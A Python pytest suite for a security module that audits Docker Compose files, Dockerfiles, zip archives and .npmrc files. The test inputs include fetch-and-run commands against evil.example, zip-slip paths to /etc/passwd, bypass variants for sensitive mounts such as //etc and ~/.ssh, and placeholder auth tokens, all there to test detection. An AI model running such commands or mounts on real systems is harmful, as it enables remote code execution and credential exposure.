"""security 模块测试（WBS-25 安全、权限与默认保护）。"""

from __future__ import annotations

import contextlib
import logging
import textwrap
from pathlib import Path

import pytest

from local_webpage_access.security import (
    LEVEL_CRITICAL,
    LEVEL_INFO,
    LEVEL_WARN,
    SecurityError,
    SecurityFinding,
    assert_no_critical,
    audit_compose,
    audit_dockerfile,
    audit_zip_members,
    has_critical,
    trusted_zip_hint,
    unknown_zip_risk_hint,
    validate_manager_binding,
)


# ---- 辅助 -----------------------------------------------------------------


def _codes(findings: list[SecurityFinding]) -> list[str]:
    return [f.code for f in findings]


def _critical_codes(findings: list[SecurityFinding]) -> list[str]:
    return [f.code for f in findings if f.level == LEVEL_CRITICAL]


# ---- SecurityFinding -----------------------------------------------------


def test_finding_to_dict_with_detail() -> None:
    f = SecurityFinding(LEVEL_WARN, "x", "msg", detail="d")
    assert f.to_dict() == {
        "level": "warn",
        "code": "x",
        "message": "msg",
        "detail": "d",
    }


def test_finding_to_dict_without_detail() -> None:
    f = SecurityFinding(LEVEL_INFO, "x", "msg")
    assert f.to_dict() == {"level": "info", "code": "x", "message": "msg"}


def test_finding_is_frozen() -> None:
    f = SecurityFinding(LEVEL_INFO, "x", "msg")
    with pytest.raises(Exception):  # dataclass(frozen=True)
        f.level = "warn"  # type: ignore[misc]


# ---- audit_compose -------------------------------------------------------


_CLEAN_COMPOSE = """\
name: demo
services:
  app:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    ports:
      - "${HOST_PORT}:${INTERNAL_PORT}"
    volumes:
      - ../data:/app/data
    restart: unless-stopped
"""


def test_audit_compose_clean_template_no_critical() -> None:
    findings = audit_compose(_CLEAN_COMPOSE)
    assert _critical_codes(findings) == []


@pytest.mark.parametrize("source", ["../data/instance", "./data/instance"])
def test_audit_compose_data_subdirectory_is_allowed(source: str) -> None:
    """平台生成的 ../data/instance 属于实例自己的 data/，不得报 unexpected_host_mount。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        f"      - ../data:/app/data\n      - {source}:/app/instance",
    )
    findings = audit_compose(text)
    assert "unexpected_host_mount" not in _codes(findings)
    assert _critical_codes(findings) == []

    outside = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../other:/app/other",
    )
    assert "unexpected_host_mount" in _codes(audit_compose(outside))


def test_audit_compose_detects_privileged() -> None:
    text = _CLEAN_COMPOSE.replace(
        "    restart: unless-stopped\n", "    privileged: true\n    restart: unless-stopped\n"
    )
    findings = audit_compose(text)
    assert "privileged" in _critical_codes(findings)


def test_audit_compose_detects_docker_socket_short_form() -> None:
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /var/run/docker.sock:/var/run/docker.sock",
    )
    findings = audit_compose(text)
    assert "docker_socket_mount" in _critical_codes(findings)


def test_audit_compose_detects_docker_socket_long_form() -> None:
    text = """\
services:
  app:
    image: x
    volumes:
      - type: bind
        source: /var/run/docker.sock
        target: /var/run/docker.sock
"""
    findings = audit_compose(text)
    assert "docker_socket_mount" in _critical_codes(findings)


def test_audit_compose_detects_host_sensitive_root() -> None:
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /etc:/etc",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_home_root_is_critical() -> None:
    """issue#1：家目录整体挂载仍 critical（等价 /home、/Users）。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /home:/host-home",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_user_home_root_is_critical() -> None:
    """BUG-532：某用户的整个家目录（/home/alice）等价于 /home，critical。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /home/alice:/host-home:ro",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_user_home_root_macos_is_critical() -> None:
    """BUG-532：/Users/<user> 整个家目录同样 critical。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /Users/alice:/host-home",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_user_home_normpath_bypass_is_critical() -> None:
    """CHK-225：/home//<user>、/home/./<user> 等等价路径不得绕过整家目录判定。"""
    for src in (
        "/home//alice:/host-home",
        "/home/./alice:/host-home:ro",
        "/Users/alice/../alice:/host-home",
    ):
        text = _CLEAN_COMPOSE.replace(
            "      - ../data:/app/data",
            f"      - ../data:/app/data\n      - {src}",
        )
        findings = audit_compose(text)
        assert "host_sensitive_mount" in _critical_codes(findings), src


def test_audit_compose_home_subpath_nonsensitive_allowed() -> None:
    """issue#1：家目录下的普通业务目录（extraVolumes 场景）放行。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /home/fenix-wang/.openclaw/workspace:/workspace:ro",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" not in _critical_codes(findings)


def test_audit_compose_home_subpath_credential_dir_is_critical() -> None:
    """issue#1：家目录下的凭据目录（.ssh 等）仍 critical。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /home/alice/.ssh:/ssh:ro",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_detects_host_sensitive_nested() -> None:
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /var/lib/docker:/host-docker",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_non_home_absolute_mount_allowed() -> None:
    """BUG-784：非家目录的普通绝对路径（/tmp、/mnt、/data 等）不得被判 critical。"""
    for src in (
        "/tmp/lwa-drill-vol:/mnt/drill:ro",
        "/mnt/usb-photos:/photos:ro",
        "/data/shared:/shared",
    ):
        text = _CLEAN_COMPOSE.replace(
            "      - ../data:/app/data",
            f"      - ../data:/app/data\n      - {src}",
        )
        findings = audit_compose(text)
        assert "host_sensitive_mount" not in _critical_codes(findings), src


def test_audit_compose_host_root_mount_is_critical() -> None:
    """BUG-784：挂载宿主根目录本身仍 critical。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - /:/host-root:ro",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_double_slash_prefix_cannot_bypass() -> None:
    """BUG-791：normpath 保留恰好两个前导斜杠，//etc 等不得绕过敏感目录审计。"""
    for src in (
        "//:/host-root:ro",
        "//etc:/host-etc:ro",
        "//root:/host-root2:ro",
        "//var/lib/docker:/host-docker:ro",
        "//proc:/host-proc:ro",
        "//home/alice/.ssh:/ssh:ro",
    ):
        text = _CLEAN_COMPOSE.replace(
            "      - ../data:/app/data",
            f"      - ../data:/app/data\n      - {src}",
        )
        findings = audit_compose(text)
        assert "host_sensitive_mount" in _critical_codes(findings), src


def test_audit_compose_double_slash_business_path_allowed() -> None:
    """BUG-791：折叠前导斜杠后，//mnt/data 这类业务路径保持放行。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - //mnt/data:/data:ro",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" not in _critical_codes(findings)


def test_audit_compose_normalizes_relative_host_mount_traversal() -> None:
    """BUG-304：相对 bind source 规范化后落入敏感目录必须 critical。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ./data/../../../../etc:/host-etc",
    )

    findings = audit_compose(text)

    assert "host_sensitive_mount" in _critical_codes(findings)


@pytest.mark.parametrize(
    "source",
    [
        "./data/../../etc",
        "./data/../../etc/passwd",
        "./data/../../var/log",
        "./data/../../../var/lib/docker",
    ],
)
def test_audit_compose_relative_traversal_nested_sensitive_is_critical(
    source: str,
) -> None:
    """BUG-304：穿越后命中敏感目录或其子路径，不得仅 warn。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        f"      - {source}:/host-sensitive",
    )

    findings = audit_compose(text)

    assert "host_sensitive_mount" in _critical_codes(findings)
    assert "unexpected_host_mount" not in _codes(findings)


def test_audit_compose_expansion_var_sensitive_is_critical() -> None:
    """BUG-184：${VAR}/~ 形式的敏感宿主路径不得按命名卷放行。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - ${HOME}/.ssh:/root/.ssh:ro",
    )
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)

    text2 = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - ~/.aws:/root/.aws:ro",
    )
    assert "host_sensitive_mount" in _critical_codes(audit_compose(text2))


def test_audit_compose_expansion_var_nonsensitive_warns() -> None:
    """BUG-184：${VAR}/~ 非敏感宿主路径至少 warn，不再静默按命名卷放行。"""
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - ${HOME}/some-data:/data",
    )
    findings = audit_compose(text)
    codes = _codes(findings)
    assert "unexpected_host_mount" in codes
    assert "host_sensitive_mount" not in _critical_codes(findings)
    # 真命名卷仍放行（不误报）
    text_named = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - my_named_vol:/app/extra",
    )
    named_findings = audit_compose(text_named)
    assert "unexpected_host_mount" not in _codes(named_findings)


def test_audit_compose_detects_dict_volume_host_sensitive() -> None:
    """BUG-032：Compose dict 格式 volumes 的宿主路径也要审计。"""
    text = """\
services:
  app:
    image: x
    volumes:
      /app/data: /etc/passwd
"""
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_detects_windows_drive_sensitive_mount() -> None:
    """BUG-042：Windows 盘符 bind mount 不应被当作命名卷放行。"""
    text = """\
services:
  app:
    image: x
    volumes:
      - C:\\Users:/app/host
"""
    findings = audit_compose(text)
    assert "host_sensitive_mount" in _critical_codes(findings)


def test_audit_compose_allows_named_volume() -> None:
    text = """\
services:
  app:
    image: x
    volumes:
      - app_data:/app/data
volumes:
  app_data: {}
"""
    findings = audit_compose(text)
    # 命名卷不应触发 critical
    assert _critical_codes(findings) == []


def test_audit_compose_warns_unexpected_relative_mount() -> None:
    text = _CLEAN_COMPOSE.replace(
        "      - ../data:/app/data",
        "      - ../data:/app/data\n      - ../secrets:/run/secrets",
    )
    findings = audit_compose(text)
    assert "unexpected_host_mount" in _codes(findings)
    assert "unexpected_host_mount" not in _critical_codes(findings)


def test_audit_compose_warns_host_network() -> None:
    text = _CLEAN_COMPOSE.replace(
        "    restart: unless-stopped\n",
        "    network_mode: host\n    restart: unless-stopped\n",
    )
    findings = audit_compose(text)
    assert "host_network" in _codes(findings)
    assert "host_network" not in _critical_codes(findings)


def test_audit_compose_warns_dangerous_capability() -> None:
    text = _CLEAN_COMPOSE.replace(
        "    restart: unless-stopped\n",
        "    cap_add: [SYS_ADMIN]\n    restart: unless-stopped\n",
    )
    findings = audit_compose(text)
    assert "dangerous_capability" in _codes(findings)


def test_audit_compose_warns_capability_all() -> None:
    """``cap_add: ALL`` 必须按危险 capability 告警。"""
    text = _CLEAN_COMPOSE.replace(
        "    restart: unless-stopped\n",
        "    cap_add: [ALL]\n    restart: unless-stopped\n",
    )
    findings = audit_compose(text)
    assert "dangerous_capability" in _codes(findings)


def test_audit_compose_warns_root_user() -> None:
    text = _CLEAN_COMPOSE.replace(
        "    restart: unless-stopped\n",
        "    user: root\n    restart: unless-stopped\n",
    )
    findings = audit_compose(text)
    assert "root_user" in _codes(findings)


def test_audit_compose_invalid_yaml() -> None:
    findings = audit_compose("services: [this is not : valid yaml")
    assert "invalid_yaml" in _critical_codes(findings)


def test_audit_compose_not_a_mapping() -> None:
    findings = audit_compose("- just\n- a\n- list\n")
    assert "invalid_yaml" in _critical_codes(findings)


def test_audit_compose_custom_allowed_mounts() -> None:
    text = """\
services:
  app:
    image: x
    volumes:
      - ./uploads:/app/uploads
"""
    # 默认不允许 ./uploads
    findings = audit_compose(text)
    assert "unexpected_host_mount" in _codes(findings)
    # 扩展白名单后应放行
    findings2 = audit_compose(
        text, allowed_host_mounts=frozenset({"./data", "../data", "./uploads"})
    )
    assert "unexpected_host_mount" not in _codes(findings2)


# ---- audit_dockerfile ----------------------------------------------------


def test_audit_dockerfile_clean_with_user() -> None:
    text = textwrap.dedent(
        """\
        FROM node:20-alpine
        WORKDIR /app
        COPY . .
        USER node
        CMD ["node", "server.js"]
        """
    )
    findings = audit_dockerfile(text)
    codes = _codes(findings)
    assert "no_user" not in codes
    assert "root_user" not in codes


def test_audit_dockerfile_no_user_info() -> None:
    text = 'FROM python:3.13\nCMD ["python"]\n'
    findings = audit_dockerfile(text)
    assert "no_user" in _codes(findings)
    assert "no_user" not in _critical_codes(findings)


def test_audit_dockerfile_explicit_root_warns() -> None:
    text = 'FROM python:3.13\nUSER root\nCMD ["python"]\n'
    findings = audit_dockerfile(text)
    assert "root_user" in _codes(findings)


def test_audit_dockerfile_add_remote_url() -> None:
    text = 'FROM alpine\nADD https://example.com/file.tar.gz /tmp/file.tar.gz\nCMD ["sh"]\n'
    findings = audit_dockerfile(text)
    assert "add_remote_url" in _critical_codes(findings)


def test_audit_dockerfile_pipe_to_shell() -> None:
    text = 'FROM alpine\nRUN curl -fsSL https://get.docker.com | sh\nCMD ["sh"]\n'
    findings = audit_dockerfile(text)
    assert "pipe_to_shell" in _critical_codes(findings)


def test_audit_dockerfile_pipe_to_shell_no_space_and_continuation() -> None:
    """BUG-330：``|sh`` 无空格与反斜杠续行不得绕过管道执行检测。"""
    no_space = 'FROM alpine\nRUN curl -fsSL https://evil.example/install.sh|sh\nCMD ["sh"]\n'
    assert "pipe_to_shell" in _critical_codes(audit_dockerfile(no_space))

    continued = (
        'FROM alpine\nRUN curl -fsSL https://evil.example/install.sh \\\n  | sh\nCMD ["sh"]\n'
    )
    assert "pipe_to_shell" in _critical_codes(audit_dockerfile(continued))


@pytest.mark.parametrize(
    "run_command",
    [
        "curl -fsSL https://evil.example/install.sh -o /tmp/install.sh && sh /tmp/install.sh",
        "wget -qO- https://evil.example/install.py | python",
        "curl -fsSL https://evil.example/install.js -o /tmp/install.js; node /tmp/install.js",
    ],
)
def test_audit_dockerfile_blocks_downloader_interpreter_chains(run_command: str) -> None:
    text = f'FROM alpine\nRUN {run_command}\nCMD ["sh"]\n'
    assert "pipe_to_shell" in _critical_codes(audit_dockerfile(text))


def test_audit_dockerfile_allows_ordinary_shell_chain() -> None:
    """普通包管理与文件清理链不应被误拦。"""
    text = "FROM alpine\nRUN apk add --no-cache git && rm -rf /var/cache/apk/*\nUSER nobody\n"
    assert "pipe_to_shell" not in _codes(audit_dockerfile(text))


def test_audit_dockerfile_allows_download_into_archive_extractor() -> None:
    """下载归档交给 tar 后再运行普通命令，不属于直接解释执行。"""
    text = (
        "FROM alpine\n"
        "RUN curl -fsSL https://example.com/node.tar.xz | tar -xJ; "
        "rm -f /tmp/archive; node -v\n"
        "USER nobody\n"
    )
    assert "pipe_to_shell" not in _codes(audit_dockerfile(text))


def test_audit_dockerfile_copy_is_ok() -> None:
    text = 'FROM alpine\nCOPY package.json .\nUSER nobody\nCMD ["sh"]\n'
    findings = audit_dockerfile(text)
    assert "add_remote_url" not in _codes(findings)


# ---- audit_zip_members ---------------------------------------------------


def test_audit_zip_members_clean() -> None:
    findings = audit_zip_members(["index.html", "css/style.css", "js/app.js"])
    assert findings == []


def test_audit_zip_members_absolute_path() -> None:
    findings = audit_zip_members(["/etc/passwd", "index.html"])
    assert "zip_absolute_path" in _critical_codes(findings)


def test_audit_zip_members_drive_letter() -> None:
    findings = audit_zip_members(["C:/Windows/System32/evil.dll"])
    assert "zip_drive_letter" in _critical_codes(findings)


def test_audit_zip_members_traversal_escape() -> None:
    findings = audit_zip_members(["../../../etc/passwd", "app/index.html"])
    assert "zip_slip" in _critical_codes(findings)


def test_audit_zip_members_traversal_within_is_ok() -> None:
    # 在 zip 根范围内的 .. 不会逃逸：a/../b == b
    findings = audit_zip_members(["a/../b.txt", "x/y/../../z.txt"])
    assert findings == []


def test_audit_zip_members_windows_backslash_traversal() -> None:
    findings = audit_zip_members(["..\\..\\evil.txt"])
    assert "zip_slip" in _critical_codes(findings)


def test_audit_zip_members_symlink_detected() -> None:
    """符号链接成员应被检测为 critical（BUG-049）。

    modes 参数为已从 external_attr >> 16 提取的 Unix 模式位。
    """
    import stat as stat_mod

    symlink_mode = stat_mod.S_IFLNK | 0o777  # 已移位的 Unix 模式
    findings = audit_zip_members(["index.html", "link.txt"], modes=[0, symlink_mode])
    assert "zip_symlink" in _critical_codes(findings)


def test_audit_zip_members_symlink_short_modes_ok() -> None:
    """modes 短缺时仅按名称审计剩余成员，不越界（BUG-049 防御）。"""
    # modes 长度 1，只对应第一个成员；第二项无模式信息，仅按名称审计
    # 第一个成员 index.html 不是 symlink（mode=0），第二个按名称无发现
    findings = audit_zip_members(["index.html", "link.txt"], modes=[0])
    assert findings == []


# ---- sanitize_zip_members（IMP-001）--------------------------------------


def test_sanitize_strips_node_modules_tree() -> None:
    """node_modules/ 下所有成员（任意深度）应整体剥离。"""
    from local_webpage_access.security import sanitize_zip_members

    names = [
        "index.html",
        "node_modules/react/index.js",
        "node_modules/.bin/vite",
        "node_modules/react/package.json",
        "package.json",
    ]
    result = sanitize_zip_members(names)
    kept = [names[i] for i in result.keep_indices]
    assert kept == ["index.html", "package.json"]
    assert "node_modules" in result.categories
    assert result.categories["node_modules"] == 3


def test_sanitize_strips_cache_dirs_and_ds_store() -> None:
    """__pycache__ / .pytest_cache / .DS_Store / __MACOSX 均剥离。"""
    from local_webpage_access.security import sanitize_zip_members

    names = [
        "app.py",
        "__pycache__/app.cpython-313.pyc",
        ".pytest_cache/v/cache/lastfailed",
        ".DS_Store",
        "__MACOSX/._index.html",
        "src/main.py",
    ]
    result = sanitize_zip_members(names)
    kept = [names[i] for i in result.keep_indices]
    assert kept == ["app.py", "src/main.py"]
    assert result.categories["__pycache__"] == 1
    assert result.categories[".pytest_cache"] == 1
    assert result.categories[".DS_Store"] == 1
    assert result.categories["__MACOSX"] == 1


def test_sanitize_preserves_lockfiles_source_dist_config() -> None:
    """lockfile / 源码 / dist/ / build/ / 配置文件必须保留。"""
    from local_webpage_access.security import sanitize_zip_members

    names = [
        "package-lock.json",
        "pnpm-lock.yaml",
        "yarn.lock",
        "requirements.txt",
        "src/index.ts",
        "dist/bundle.js",
        "build/output.js",
        "public/favicon.ico",
        ".env.example",
        "config.yaml",
    ]
    result = sanitize_zip_members(names)
    kept = [names[i] for i in result.keep_indices]
    # 全部保留，无剥离
    assert kept == names
    assert result.stripped_names == ()


def test_sanitize_preserves_bare_env_dir() -> None:
    """裸 env/ 不剥离（与「保留配置文件」规则冲突，IMP-001 刻意排除）。"""
    from local_webpage_access.security import sanitize_zip_members

    names = ["env/config.py", ".venv/bin/python", "venv/bin/python"]
    result = sanitize_zip_members(names)
    kept = [names[i] for i in result.keep_indices]
    # 裸 env/ 保留；.venv / venv 仍剥离
    assert "env/config.py" in kept
    assert ".venv/bin/python" not in kept
    assert "venv/bin/python" not in kept


def test_sanitize_counts_stripped_symlinks() -> None:
    """被剥离成员中的 symlink（如 node_modules/.bin/*）应被计数。"""
    import stat as stat_mod

    from local_webpage_access.security import sanitize_zip_members

    symlink_mode = (stat_mod.S_IFLNK | 0o777) << 16  # 原始 external_attr
    # sanitize 接收的是 >> 16 之后的模式位
    names = [
        "node_modules/.bin/vite",
        "node_modules/.bin/esbuild",
        "index.html",
    ]
    modes = [
        (symlink_mode >> 16) & 0xFFFF,
        (symlink_mode >> 16) & 0xFFFF,
        0,
    ]
    result = sanitize_zip_members(names, modes=modes)
    assert result.stripped_symlink_count == 2
    assert [names[i] for i in result.keep_indices] == ["index.html"]


def test_sanitize_keep_indices_preserve_order() -> None:
    """keep_indices 保持原列表顺序，调用方据此顺序解压。"""
    from local_webpage_access.security import sanitize_zip_members

    names = ["z.txt", "node_modules/a", "a.txt", "__pycache__/b", "m.txt"]
    result = sanitize_zip_members(names)
    assert result.keep_indices == (0, 2, 4)
    assert result.keep_indices == tuple(sorted(result.keep_indices))


def test_sanitize_empty_input() -> None:
    from local_webpage_access.security import sanitize_zip_members

    result = sanitize_zip_members([])
    assert result.keep_indices == ()
    assert result.stripped_names == ()
    assert result.stripped_symlink_count == 0
    assert result.categories == {}


def test_sanitize_nested_strippable_under_source() -> None:
    """源码目录下的 __pycache__ / node_modules 也要剥离（任意层级）。"""
    from local_webpage_access.security import sanitize_zip_members

    names = [
        "backend/app.py",
        "backend/__pycache__/app.pyc",
        "frontend/src/App.tsx",
        "frontend/node_modules/react/index.js",
    ]
    result = sanitize_zip_members(names)
    kept = [names[i] for i in result.keep_indices]
    assert kept == ["backend/app.py", "frontend/src/App.tsx"]


# ---- 包管理器构建配置内容级过滤（BUG-870）-----------------------------------


def test_sanitize_preserves_npmrc_and_yarnrc() -> None:
    """BUG-870：.npmrc/.yarnrc/.yarnrc.yml 是构建配置，不再整文件剥离。"""
    from local_webpage_access.security import sanitize_zip_members

    names = [
        ".npmrc",
        "frontend/.npmrc",
        ".yarnrc",
        "frontend/.yarnrc.yml",
        ".DS_Store",
        "yarn-error.log",
    ]
    result = sanitize_zip_members(names)
    kept = [names[i] for i in result.keep_indices]
    # 构建配置（任意层级）保留
    assert ".npmrc" in kept
    assert "frontend/.npmrc" in kept
    assert ".yarnrc" in kept
    assert "frontend/.yarnrc.yml" in kept
    # 纯冗余项仍整文件剥离
    assert ".DS_Store" not in kept
    assert "yarn-error.log" not in kept


def test_filter_config_auth_lines_keeps_build_config() -> None:
    """legacy-peer-deps / registry / engines 严格度等构建配置行必须原样保留。"""
    from local_webpage_access.security import filter_config_auth_lines

    content = (
        "registry=https://registry.npmmirror.com\n"
        "legacy-peer-deps=true\n"
        "engine-strict=false\n"
        "save-exact=true\n"
    )
    filtered, removed = filter_config_auth_lines(content)
    assert filtered == content
    assert removed == []


def test_filter_config_auth_lines_does_not_match_author_key() -> None:
    """``author=...`` 等普通键不得误伤（BUG-870 回归）。"""
    from local_webpage_access.security import filter_config_auth_lines

    content = "author=someone\n"
    filtered, removed = filter_config_auth_lines(content)
    assert filtered == content
    assert removed == []


def test_filter_config_auth_lines_strips_credential_lines() -> None:
    """_authToken/_auth/_password/token= 等认证行被剥离并报告行号。"""
    from local_webpage_access.security import filter_config_auth_lines

    content = (
        "legacy-peer-deps=true\n"
        "//registry.npmjs.org/:_authToken=npm_xxxxxxxx\n"
        "_auth=YWRtaW46czNjcjN0\n"
        "//registry.example.com/:_password=hunter2\n"
        "token=abc123\n"
        "engine-strict=false\n"
    )
    filtered, removed = filter_config_auth_lines(content)
    # 构建配置行原样保留，认证行全部剥离
    assert filtered == "legacy-peer-deps=true\nengine-strict=false\n"
    assert [n for n, _ in removed] == [2, 3, 4, 5]


def test_filter_config_auth_lines_strips_quoted_credential_keys() -> None:
    """BUG-899：npm INI 解析器接受带引号的键——``"//host/:_authToken"=secret``
    这类写法认证键后紧跟引号而非分隔符，不得绕过过滤把令牌带进镜像。"""
    from local_webpage_access.security import filter_config_auth_lines

    content = (
        "legacy-peer-deps=true\n"
        '"//registry.npmjs.org/:_authToken"=npm_secret\n'
        "'//registry.npmjs.org/:_auth'=dXNlcjpwYXNz\n"
        '"_password"=hunter2\n'
        '"token" = abc123\n'
        '"npmAuthToken": "yarn-secret"\n'
        "registry=https://registry.npmmirror.com\n"
    )
    filtered, removed = filter_config_auth_lines(content)
    assert filtered == (
        "legacy-peer-deps=true\nregistry=https://registry.npmmirror.com\n"
    )
    assert [n for n, _ in removed] == [2, 3, 4, 5, 6]


def test_filter_config_auth_lines_yarnrc_yml() -> None:
    """yarnrc.yml 的 npmAuthToken 同样剥离；其余 yarn 配置保留。"""
    from local_webpage_access.security import filter_config_auth_lines

    content = (
        'nodeLinker: node-modules\n'
        'npmRegistryServer: "https://registry.example.com"\n'
        'npmAuthToken: "secret-token"\n'
        'npmAuthIdent: "user:pass"\n'
    )
    filtered, removed = filter_config_auth_lines(content)
    assert "nodeLinker" in filtered
    assert "npmRegistryServer" in filtered
    assert "npmAuthToken" not in filtered
    assert "npmAuthIdent" not in filtered
    assert [n for n, _ in removed] == [3, 4]


@contextlib.contextmanager
def _lwa_logs(caplog: pytest.LogCaptureFixture):
    """BUG-898：caplog 显式挂到 lwa logger 上再捕获。

    CLI 用例触发 ``setup_logging()`` 后 ``local_webpage_access`` logger 的
    ``propagate=False``——仅挂 root 的 caplog.handler 在部分 pytest 版本收
    不到子 logger 记录（本项目 .venv 的 pytest 实测不受影响，属版本相关的
    顺序脆弱性）。显式挂载后无论是否传播都稳定捕获，退出时摘除不泄漏。
    """
    logger = logging.getLogger("local_webpage_access")
    logger.addHandler(caplog.handler)
    try:
        yield
    finally:
        logger.removeHandler(caplog.handler)


def test_safe_extract_filters_npmrc_auth_lines_and_warns(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """BUG-870 集成：导入时 .npmrc 保留构建配置、剥离认证行并告警。"""
    import zipfile

    from local_webpage_access.zip_processor import safe_extract

    zip_path = tmp_path / "app.zip"
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr(
            ".npmrc",
            "legacy-peer-deps=true\n//registry.npmjs.org/:_authToken=npm_secret\n",
        )
        zf.writestr("package.json", "{}")
    target = tmp_path / "out"
    with _lwa_logs(caplog), caplog.at_level("WARNING"):
        result = safe_extract(zip_path, target)
    extracted = (target / ".npmrc").read_text(encoding="utf-8")
    assert extracted == "legacy-peer-deps=true\n"
    assert result.content_filtered == {".npmrc": (2,)}
    assert any(".npmrc" in r.message and "认证" in r.message for r in caplog.records)


def test_safe_extract_keeps_clean_npmrc_silently(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """无敏感行的 .npmrc 静默保留、不告警、不登记 content_filtered。"""
    import zipfile

    from local_webpage_access.zip_processor import safe_extract

    content = "legacy-peer-deps=true\nregistry=https://registry.npmmirror.com\n"
    zip_path = tmp_path / "app.zip"
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr("frontend/.npmrc", content)
        zf.writestr("frontend/package.json", "{}")
    target = tmp_path / "out"
    with _lwa_logs(caplog), caplog.at_level("WARNING"):
        result = safe_extract(zip_path, target)
    # 单层根目录拍平：frontend/ 提升一层，.npmrc 落在 target 根
    assert (target / ".npmrc").read_text(encoding="utf-8") == content
    assert result.content_filtered == {}
    assert not any(".npmrc" in r.message for r in caplog.records)


def test_safe_extract_strips_undecodable_npmrc_conservatively(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """评审 P2：含非 UTF-8 字节（如 Windows-1252 注释）的 .npmrc 不得原样
    保留——解码失败即无法确认凭据行是否被过滤，保守整文件剥离并告警，
    登记 content_stripped；压缩包内其余文件正常解压。"""
    import zipfile

    from local_webpage_access.zip_processor import safe_extract

    zip_path = tmp_path / "app.zip"
    # Windows-1252 的「é」(0xE9) 不是合法 UTF-8；同行含 _authToken 凭据
    payload = b"# caf\xe9 comment\n//registry.npmjs.org/:_authToken=npm_secret\n"
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr(".npmrc", payload)
        zf.writestr("package.json", "{}")
    target = tmp_path / "out"
    with _lwa_logs(caplog), caplog.at_level("WARNING"):
        result = safe_extract(zip_path, target)
    assert not (target / ".npmrc").exists()
    assert (target / "package.json").is_file()
    assert result.content_filtered == {}
    assert result.content_stripped == (".npmrc",)
    assert any(".npmrc" in r.message and "保守" in r.message for r in caplog.records)


# ---- 风险提示（WBS-25.09）-------------------------------------------------


def test_unknown_zip_risk_hint_nonempty() -> None:
    hint = unknown_zip_risk_hint()
    assert isinstance(hint, str)
    assert len(hint) > 20
    assert "pending" in hint or "未识别" in hint or "风险" in hint


def test_trusted_zip_hint_nonempty() -> None:
    hint = trusted_zip_hint()
    assert isinstance(hint, str)
    assert len(hint) > 10


def test_unknown_and_trusted_hints_differ() -> None:
    assert unknown_zip_risk_hint() != trusted_zip_hint()


# ---- 管理页绑定策略（WBS-25.02）-------------------------------------------


def test_validate_binding_loopback_ok() -> None:
    findings = validate_manager_binding("127.0.0.1", has_token=True)
    assert findings == []


def test_validate_binding_loopback_ok_without_token() -> None:
    # 回环地址无 token 也不算 critical（本机自用）
    findings = validate_manager_binding("127.0.0.1", has_token=False)
    assert _critical_codes(findings) == []


def test_validate_binding_lan_with_token_info() -> None:
    findings = validate_manager_binding("0.0.0.0", has_token=True, port=17800)
    assert any(f.level == LEVEL_INFO for f in findings)
    assert _critical_codes(findings) == []


def test_validate_binding_lan_without_token_critical() -> None:
    findings = validate_manager_binding("0.0.0.0", has_token=False)
    assert "lan_bind_no_token" in _critical_codes(findings)


def test_validate_binding_localhost_string() -> None:
    findings = validate_manager_binding("localhost", has_token=False)
    assert findings == []


# ---- 聚合校验 -------------------------------------------------------------


def test_has_critical_true_false() -> None:
    assert has_critical([SecurityFinding(LEVEL_CRITICAL, "x", "y")])
    assert not has_critical([SecurityFinding(LEVEL_WARN, "x", "y")])


def test_assert_no_critical_passes_when_clean() -> None:
    assert_no_critical([SecurityFinding(LEVEL_WARN, "x", "y")])
    assert_no_critical([])


def test_assert_no_critical_raises_on_critical() -> None:
    findings = [SecurityFinding(LEVEL_CRITICAL, "privileged", "boom")]
    with pytest.raises(SecurityError) as exc_info:
        assert_no_critical(findings)
